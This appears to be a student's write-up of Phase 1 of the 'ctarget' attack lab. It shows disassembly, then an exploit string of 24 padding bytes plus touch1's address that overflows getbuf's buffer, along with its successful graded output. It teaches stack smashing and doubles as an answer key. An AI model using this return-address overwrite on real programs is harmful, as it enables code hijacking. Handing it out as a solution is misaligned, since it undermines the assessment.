Phase 1
```c
objdump -d ctarget

```

```c
00000000004017dc <touch1>:
  4017dc:	48 83 ec 08          	sub    $0x8,%rsp
  4017e0:	c7 05 12 2d 20 00 01 	movl   $0x1,0x202d12(%rip)        # 6044fc <vlevel>
  4017e7:	00 00 00 
  4017ea:	bf 40 2f 40 00       	mov    $0x402f40,%edi
  4017ef:	e8 5c f4 ff ff       	callq  400c50 <puts@plt>
  4017f4:	bf 01 00 00 00       	mov    $0x1,%edi
  4017f9:	e8 fb 03 00 00       	callq  401bf9 <validate>
  4017fe:	bf 00 00 00 00       	mov    $0x0,%edi
  401803:	e8 e8 f5 ff ff       	callq  400df0 <exit@plt>

getbuf:
=> 0x00000000004017c6 <+0>:	sub    $0x18,%rsp <= 0x18 is 24 Bytes
   0x00000000004017ca <+4>:	mov    %rsp,%rdi
   0x00000000004017cd <+7>:	callq  0x401a0a <Gets>
   0x00000000004017d2 <+12>:	mov    $0x1,%eax
   0x00000000004017d7 <+17>:	add    $0x18,%rsp
   0x00000000004017db <+21>:	retq  

```
We then grab the address of touch1 from objdump -d ctarget address : 00000000004017dc and padd the answer with 24 bytes
```c
emacs phase1.txt
```
```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
dc 17 40 00 00 00 00 00
```
Save the file with <kbd>CTRL</kbd>+<kbd>x</kbd> then <kbd>CTRL</kbd>+<kbd>c</kbd> then <kbd>y</kbd>
```
call ./hex2raw < phase1.txt > rawphase1.txt
```
```
call ./ctarget < rawphase1.txt
```
```
Cookie: 0x19195f9f
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Sent exploit string to server to be validated.
NICE JOB!
```
